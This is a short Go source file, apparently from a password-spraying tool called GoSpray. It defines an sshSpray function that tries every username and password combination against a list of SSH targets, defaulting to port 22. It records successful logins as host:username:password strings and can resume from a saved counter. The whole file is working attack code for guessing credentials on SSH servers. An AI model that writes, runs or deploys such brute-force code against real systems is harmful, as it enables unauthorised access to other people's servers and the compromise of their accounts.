package main

import (
	"fmt"
	"github.com/GoSpray/gossh"
	"sync"
)



func sshSpray(wg *sync.WaitGroup, channelToCommunicate chan string,  taskToRun task, storeResult *int) {
	defer wg.Done()
	internalCounter := 0
	for _,taskTarget := range taskToRun.targetsRaw {
		temporaryTarget := parseTarget(taskTarget)
		taskToRun.target = temporaryTarget
		if taskToRun.target.port == 0 {
			taskToRun.target.port = 22
		}
		for _,password := range taskToRun.passwords {
			for _,username := range taskToRun.usernames {
				if internalCounter >= *storeResult {
					sshClient, err := gossh.DialWithPasswd(stringifyTarget(taskToRun.target), username, password)
					if err != nil {
						fmt.Print("-")
					} else {
						fmt.Print("+")
						channelToCommunicate <- taskToRun.target.host + ":" + username+":"+password
						sshClient.Close()
					}
					*storeResult++
				} else {
				}
				internalCounter++
			}
		}
	}



}